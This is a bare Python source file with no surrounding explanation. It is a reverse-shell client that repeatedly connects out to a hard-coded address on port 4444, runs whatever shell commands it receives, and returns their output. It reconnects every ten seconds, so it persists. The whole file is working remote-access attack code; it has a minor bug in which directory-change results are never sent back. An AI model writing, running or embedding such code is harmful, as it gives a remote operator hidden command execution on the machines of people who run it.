import socket
import subprocess
import time
import sys
import os

def client_listen(host='10.0.0.153'):

    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((host, 4444))
            while True:
                try:
                    cmd = client.recv(4096).decode('utf-8')
                    if not cmd:
                        break
                    if cmd.strip() == '':
                        continue
                    if cmd.lower() == 'exit':
                        client.close()
                        sys.exit(0)

                    if cmd.lower().startswith('cd'):
                        try:
                            path = cmd[3:].strip()
                            os.chdir(path) 
                            result = f"[+] Directory changed: {os.getcwd()}\n".encode('utf-8')
                        except Exception as e:
                            result = f"[!] Error to change directory: {str(e)}\n".encode('utf-8')

                    else:
                        try:
                            output = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='cp866', timeout=5)
                            result = (output.stdout + output.stderr).encode('utf-8')

                        except subprocess.TimeoutExpired:
                            result = '[!] Error: Command execution timeout exceeded \n'.encode('utf-8')

                        except Exception as e:
                            result = f'[!] Error execute command: {str(e)}\n'.encode('utf-8')

                        result_len = len(result)
                        client.send(f"{result_len:<64}".encode('utf-8'))

                        ack = client.recv(1024) 
                        if ack == b"OK_SIZE":
                            client.sendall(result)

                except:
                    break

        except (socket.error, ConnectionRefusedError):
            time.sleep(10)
            continue

    client.close()
    time.sleep(5)

if __name__ == '__main__':
    client_listen()